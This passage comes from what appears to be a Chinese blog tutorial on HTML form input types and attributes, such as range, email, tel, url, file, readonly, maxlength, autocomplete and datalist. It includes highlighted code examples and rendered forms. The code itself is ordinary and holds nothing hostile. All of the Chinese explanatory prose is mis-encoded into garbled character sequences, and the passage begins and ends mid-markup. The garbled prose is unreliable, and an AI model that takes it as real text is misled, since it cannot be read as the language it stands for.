·å¼æ˜¯ä¸€ä¸ªæ»‘å—ã€‚</p><p>å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å±æ€§æ¥è§„å®šé™åˆ¶ï¼šminã€maxã€stepã€valueã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>range<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>points<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  <input type="range" name="points" min="0" max="10"></form><br><h4 id="ç”µå­é‚®ä»¶åœ°å€è¾“å…¥-email"><a href="#ç”µå­é‚®ä»¶åœ°å€è¾“å…¥-email" class="headerlink" title="ç”µå­é‚®ä»¶åœ°å€è¾“å…¥ email"></a>ç”µå­é‚®ä»¶åœ°å€è¾“å…¥ email</h4><p><code>&lt;input type="email"&gt;</code> ç”¨äºåº”è¯¥åŒ…å«ç”µå­é‚®ä»¶åœ°å€çš„è¾“å…¥å­—æ®µã€‚</p><p>æ ¹æ®æµè§ˆå™¨æ”¯æŒï¼Œèƒ½å¤Ÿåœ¨è¢«æäº¤æ—¶è‡ªåŠ¨å¯¹ç”µå­é‚®ä»¶åœ°å€è¿›è¡ŒéªŒè¯ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªpatternæ¥åšç®€å•çš„æœ‰æ•ˆæ€§éªŒè¯ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  E-mail:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  E-mail:  <input type="email" name="email"></form><br><h4 id="æœç´¢å­—æ®µè¾“å…¥-search"><a href="#æœç´¢å­—æ®µè¾“å…¥-search" class="headerlink" title="æœç´¢å­—æ®µè¾“å…¥ search"></a>æœç´¢å­—æ®µè¾“å…¥ search</h4><p><code>&lt;input type="search"&gt;</code> ç”¨äºæœç´¢å­—æ®µï¼ˆæœç´¢å­—æ®µçš„è¡¨ç°ç±»ä¼¼å¸¸è§„æ–‡æœ¬å­—æ®µï¼‰ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  Search Miao:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>miaosearch<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  Search Miao:  <input type="search" name="googlesearch"></form><br><h4 id="ç”µè¯å·ç çš„è¾“å…¥-tel"><a href="#ç”µè¯å·ç çš„è¾“å…¥-tel" class="headerlink" title="ç”µè¯å·ç çš„è¾“å…¥ tel"></a>ç”µè¯å·ç çš„è¾“å…¥ tel</h4><p><code>&lt;input type="tel"&gt;</code> ç”¨äºåº”è¯¥åŒ…å«ç”µè¯å·ç çš„è¾“å…¥å­—æ®µã€‚</p><p>æµè§ˆå™¨æ”¯æŒä¸æ˜¯å¾ˆå¥½ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  Telephone:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tel<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>usrtel<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  Telephone:  <input type="tel" name="usrtel"></form><br><h4 id="URL-åœ°å€è¾“å…¥-url"><a href="#URL-åœ°å€è¾“å…¥-url" class="headerlink" title="URL åœ°å€è¾“å…¥ url"></a>URL åœ°å€è¾“å…¥ url</h4><p><code>&lt;input type="url"&gt;</code> ç”¨äºåº”è¯¥åŒ…å« URL åœ°å€çš„è¾“å…¥å­—æ®µã€‚</p><p>æ ¹æ®æµè§ˆå™¨æ”¯æŒï¼Œåœ¨æäº¤æ—¶èƒ½å¤Ÿè‡ªåŠ¨éªŒè¯ <code>url</code> å­—æ®µã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>  Add your website:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>website<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form>  Add your website:  <input type="url" name="website"></form><br><h4 id="æ–‡ä»¶è¾“å…¥-ä¸Šä¼ -file"><a href="#æ–‡ä»¶è¾“å…¥-ä¸Šä¼ -file" class="headerlink" title="æ–‡ä»¶è¾“å…¥/ä¸Šä¼  file"></a>æ–‡ä»¶è¾“å…¥/ä¸Šä¼  file</h4><p><code>&lt;input type="file"&gt;</code> ç”¨äºæŒ‡å®šä¸Šä¼ çš„æ–‡ä»¶ã€‚</p><input type="file"><br><h3 id="input-å…ƒç´ çš„å±æ€§"><a href="#input-å…ƒç´ çš„å±æ€§" class="headerlink" title="input å…ƒç´ çš„å±æ€§"></a>input å…ƒç´ çš„å±æ€§</h3><h4 id="value"><a href="#value" class="headerlink" title="value"></a>value</h4><p>æŒ‡å®šè¾“å…¥å­—æ®µçš„é»˜è®¤å€¼ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Miao<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><form action="">First name:<br><input type="text" name="firstname" value="Miao"><br>Last name:<br><input type="text" name="lastname"></form><br><h4 id="readonly"><a href="#readonly" class="headerlink" title="readonly"></a>readonly</h4><p>åªè¯»ï¼Œä¸å¯ä¿®æ”¹ã€‚ä½†å®ƒ<strong>ä¹Ÿä¼šä½œä¸ºå‚æ•°æäº¤ç»™æœåŠ¡å™¨ã€‚</strong></p><p>readonly å±æ€§ä¸éœ€è¦å€¼ã€‚å®ƒç­‰åŒäº readonly=â€readonlyâ€ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>John<span class="token punctuation">"</span></span> <span class="token attr-name">readonly</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><form action=""><input type="text" name="firstname" value="John" readonly=""></form> <br><h4 id="disabled"><a href="#disabled" class="headerlink" title="disabled"></a>disabled</h4><p><em>disabled</em> å±æ€§è§„å®šè¾“å…¥å­—æ®µæ˜¯ç¦ç”¨çš„ã€‚</p><p>è¢«ç¦ç”¨çš„å…ƒç´ æ˜¯ä¸å¯ç”¨å’Œä¸å¯ç‚¹å‡»çš„ã€‚è¢«ç¦ç”¨çš„å…ƒç´ <strong>ä¸ä¼šè¢«æäº¤</strong>ã€‚</p><p>disabled å±æ€§ä¹Ÿä¸éœ€è¦å€¼ã€‚å®ƒç­‰åŒäº disabled=â€disabledâ€ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>John<span class="token punctuation">"</span></span> <span class="token attr-name">disabled</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><form action=""><input type="text" name="firstname" value="John" disabled=""></form> <br><h4 id="size"><a href="#size" class="headerlink" title="size"></a>size</h4><p><em>size</em> å±æ€§è§„å®šè¾“å…¥å­—æ®µçš„å°ºå¯¸ï¼ˆä»¥å­—ç¬¦è®¡ï¼‰ã€‚</p><p>æŒ‡çš„æ˜¯è¾“å…¥æ¡†çš„é•¿åº¦ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>John<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>40<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><form action=""><input type="text" name="firstname" value="John" size="40"></form> <br><h4 id="maxlength"><a href="#maxlength" class="headerlink" title="maxlength"></a>maxlength</h4><p><em>maxlength</em> å±æ€§è§„å®šè¾“å…¥å­—æ®µå…è®¸çš„æœ€å¤§é•¿åº¦ã€‚</p><p>ä¸€ä¸ªæ±‰å­—ç®—ä½œä¸¤ä¸ªå­—ç¬¦ã€‚</p><p>å¦‚è®¾ç½® maxlength å±æ€§ï¼Œåˆ™è¾“å…¥æ§ä»¶ä¸ä¼šæ¥å—è¶…è¿‡æ‰€å…è®¸æ•°çš„å­—ç¬¦ã€‚</p><p>è¯¥å±æ€§ä¸ä¼šæä¾›ä»»ä½•åé¦ˆã€‚å¦‚æœéœ€è¦æé†’ç”¨æˆ·ï¼Œåˆ™å¿…é¡»ç¼–å†™ JavaScript ä»£ç ã€‚</p><p>æ³¨æ„ï¼Œæ— è®ºå‰ç«¯å¦‚ä½•åšæç¤ºï¼Œåªè¦çŸ¥é“äº†æäº¤çš„åœ°å€ï¼Œç…§æ ·å¯ä»¥æ„é€ ä¸€ä¸ªè¯·æ±‚è¿›è¡Œæäº¤ã€‚å› æ­¤<strong>åç«¯ä¹Ÿè¦åšå¥½ç›¸åº”çš„è¾“å…¥é™åˆ¶åˆ¤æ–­</strong>ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>John<span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><form action=""><input type="text" name="firstname" value="John" maxlength="10"></form> <br><hr><p>ä»¥ä¸‹ä¸ºH5ä¸­çš„æ–°å±æ€§ã€‚</p><h4 id="autocomplete"><a href="#autocomplete" class="headerlink" title="autocomplete"></a>autocomplete</h4><p>autocomplete å±æ€§è§„å®šè¡¨å•æˆ–è¾“å…¥å­—æ®µæ˜¯å¦åº”è¯¥è‡ªåŠ¨å®Œæˆã€‚</p><p>å½“è‡ªåŠ¨å®Œæˆå¼€å¯ï¼Œæµè§ˆå™¨ä¼šåŸºäºç”¨æˆ·ä¹‹å‰çš„è¾“å…¥å€¼è‡ªåŠ¨å¡«å†™å€¼ã€‚<strong>é»˜è®¤æ˜¯å¼€å¯çš„ã€‚</strong></p><p>å¯ä»¥æŠŠè¡¨å• form ä¸­çš„ autocomplete è®¾ç½®ä¸º onï¼ŒåŒæ—¶æŠŠç‰¹å®šçš„è¾“å…¥å­—æ®µè®¾ç½®ä¸º offï¼Œåä¹‹äº¦ç„¶ã€‚è¿™æ ·ç‰¹å®šçš„è¾“å…¥å°±ä¼šä¼˜å…ˆå®ƒè‡ªå·±çš„è®¾ç½®ã€‚</p><p>autocomplete å±æ€§é€‚ç”¨äº <code>&lt;form&gt;</code> ä»¥åŠå¦‚ä¸‹ <code>&lt;input&gt;</code> ç±»å‹ï¼štextã€searchã€urlã€telã€emailã€passwordã€datepickersã€range ä»¥åŠ colorã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>on<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   E-mail: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>off<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> </code></pre><form action="#" autocomplete="on">   First name:<input type="text" name="fname"><br>   Last name: <input type="text" name="lname"><br>   E-mail: <input type="email" name="email" autocomplete="off"><br></form> <br><h4 id="autofocus"><a href="#autofocus" class="headerlink" title="autofocus"></a>autofocus</h4><p>autofocus å±æ€§æ˜¯å¸ƒå°”å±æ€§ã€‚</p><p>å¦‚æœè®¾ç½®ï¼Œåˆ™è§„å®šå½“é¡µé¢åŠ è½½æ—¶ <code>&lt;input&gt;</code> å…ƒç´ åº”è¯¥è‡ªåŠ¨è·å¾—ç„¦ç‚¹ã€‚</p><p>å°±æ˜¯å…‰æ ‡è‡ªåŠ¨å‡ºç°åœ¨æ‰“äº†autofocusæ ‡ç­¾çš„ä½ç½®ï¼Œæ•²é”®ç›˜å°±ç›´æ¥è¾“å…¥åˆ°ç›¸åº”çš„æ–‡æœ¬æ¡†é‡Œäº†ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>  Last name:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span></code></pre><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/input_autofocus.png" alt="autofocus"></p><h4 id="height-amp-width"><a href="#height-amp-width" class="headerlink" title="height &amp; width"></a>height &amp; width</h4><p>è§„å®š <code>&lt;input&gt;</code> å…ƒç´ çš„é«˜åº¦å’Œå®½åº¦ã€‚</p><p>height å’Œ width å±æ€§ä»…ç”¨äº <code>&lt;input type="image"&gt;</code>ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img_submit.gif<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>48<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>48<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre><p>image è¾“å…¥ç±»å‹é»˜è®¤ä¼šå‘ç”Ÿç‚¹å‡»å›¾åƒæŒ‰é’®æ—¶çš„ X å’Œ Y åæ ‡ã€‚</p><h4 id="min-amp-max"><a href="#min-amp-max" class="headerlink" title="min &amp; max"></a>min &amp; max</h4><p>è§„å®š <code>&lt;input&gt;</code> å…ƒç´ çš„æœ€å°å€¼å’Œæœ€å¤§å€¼ã€‚</p><p>é€‚ç”¨çš„ç±»å‹ï¼šnumberã€rangeã€dateã€datetimeã€datetime-localã€monthã€time ä»¥åŠ weekã€‚</p><h4 id="step"><a href="#step" class="headerlink" title="step"></a>step</h4><p>è§„å®š <code>&lt;input&gt;</code> å…ƒç´ çš„åˆæ³•æ•°å­—é—´éš”ã€‚</p><p>ç¤ºä¾‹ï¼šå¦‚æœ step=â€3â€ï¼Œåˆ™åˆæ³•æ•°å­—åº”è¯¥æ˜¯ -3ã€0ã€3ã€6ã€ç­‰ç­‰ã€‚</p><p>å¯ä¸ max ä»¥åŠ min å±æ€§ä¸€åŒä½¿ç”¨ï¼Œæ¥åˆ›å»ºåˆæ³•å€¼çš„èŒƒå›´ã€‚</p><p>é€‚ç”¨äºä»¥ä¸‹è¾“å…¥ç±»å‹ï¼šnumberã€rangeã€dateã€datetimeã€datetime-localã€monthã€time ä»¥åŠ weekã€‚</p><h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><p>list å±æ€§å¼•ç”¨çš„ <code>&lt;datalist&gt;</code> å…ƒç´ ä¸­åŒ…å«äº† <code>&lt;input&gt;</code> å…ƒç´ çš„é¢„å®šä¹‰é€‰é¡¹ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">list</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>browsers<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>datalist</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>browsers<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Internet Explorer<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Firefox<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Chrome<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Opera<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Safari<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>datalist</span><span class="token punctuation">&gt;</span></span> </code></pre><input list="browsers"><datalist id="browsers">   <option value="Internet Explorer">   </option><option value="Firefox">   </option><option value="Chrome">   </option><option value="Opera">   </option><option value="Safari"></option></datalist> <br><h4 id="multiple"><a href="#multiple" class="headerlink" title="multiple"></a>multiple</h4><p>å¸ƒå°”å±æ€§ã€‚å¦‚æœè®¾ç½®ï¼Œåˆ™å…è®¸åœ¨ <code>&lt;input&gt;</code> å…ƒç´ ä¸­è¾“å…¥ä¸€ä¸ªä»¥ä¸Šçš„å€¼ã€‚</p><p>é€‚ç”¨çš„ç±»å‹ï¼šemail å’Œ fileã€‚</p><pre class="language-html" data-language="html"><code class="language-html">Select images: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img<span class="token punctuation">"</span></span> <span class="token attr-name">multiple</span><span class="token punctuation">&gt;</span></span></code></pre><p>Select images: <input type="file" name="img" multiple=""></p><p>ä¸Šé¢è¿™ä¸ªå°±æ˜¯å…è®¸ä¸Šä¼ å¤šå¼ å›¾ç‰‡ã€‚</p><h4 id="form"><a href="#form" class="headerlink" title="form"></a>form</h4><p>form å±æ€§è§„å®š <code>&lt;input&gt;</code> å…ƒç´ æ‰€å±çš„ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨å•ã€‚</p><p>å¦‚éœ€å¼•ç”¨ä¸€ä¸ªä»¥ä¸Šçš„è¡¨å•ï¼Œè¯·ä½¿ç”¨ç©ºæ ¼åˆ†éš”çš„è¡¨å• id åˆ—è¡¨ã€‚</p><p>è¾“å…¥å­—æ®µä½äº HTML è¡¨å•ä¹‹å¤–ï¼ˆä½†ä»å±è¡¨å•ï¼‰ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span 